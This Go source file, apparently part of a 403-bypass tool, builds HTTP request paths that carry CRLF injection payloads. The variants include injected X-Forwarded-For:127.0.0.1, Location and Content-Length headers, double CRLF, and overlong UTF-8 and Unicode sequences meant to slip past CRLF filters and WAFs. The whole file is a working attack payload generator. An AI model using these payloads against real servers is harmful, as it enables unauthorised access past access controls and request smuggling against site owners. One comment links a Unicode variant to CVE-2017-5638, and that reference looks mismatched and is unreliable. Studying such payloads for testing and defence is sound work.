package poc

import (
	"strings"
)

// CRLFInjection 生成 CRLF 注入 payload
// ref: 403权限绕过另类思路, nomore403
// 原理: 通过 CRLF (%0d%0a) 注入 HTTP 头部，篡改请求语义
// 部分 WAF/反代在解析路径时遇到 CRLF 会截断或异常处理
func CRLFInjection(auth string) []string {
	var results []string

	// 1. CRLF + Header 注入模式
	// 在路径中注入 CRLF 后跟头部（部分中间件会将后续内容解释为新头部）
	crlfPayloads := []string{
		"%0d%0a",                                // CRLF
		"%0d%0aX-Forwarded-For:127.0.0.1%0d%0a", // CRLF + Header injection
		"%0a",                                   // 仅 LF
		"%0d",                                   // 仅 CR
		"%0d%0a%0d%0a",                          // Double CRLF (header body separator)
		"%e5%98%8a%e5%98%8d",                    // Unicode variant CRLF (CVE-2017-5638 style)
	}

	for _, crlf := range crlfPayloads {
		// 在路径末尾注入
		results = append(results, auth+crlf)

		// 在路径开头注入（在第一个 / 之后）
		if strings.HasPrefix(auth, "/") {
			results = append(results, "/"+crlf+auth[1:])
		}

		// 在路径段之间注入
		lastSlash := strings.LastIndex(auth, "/")
		if lastSlash > 0 {
			results = append(results, auth[:lastSlash]+"/"+crlf+auth[lastSlash+1:])
		}
	}

	// 2. CRLF + 路径穿越组合
	results = append(results, auth+"%0d%0aLocation:%20/")
	results = append(results, auth+"%0d%0aContent-Length:%200%0d%0a%0d%0a")

	// 3. Unicode CRLF 变体（绕过 CRLF 过滤）
	unicodeCRLF := []string{
		"%c0%8d%c0%8a", // Overlong UTF-8 CR LF
		"%e5%98%8a",    // Unicode line separator
	}
	for _, uc := range unicodeCRLF {
		results = append(results, auth+uc)
		if strings.HasPrefix(auth, "/") {
			results = append(results, "/"+uc+auth[1:])
		}
	}

	return results
}
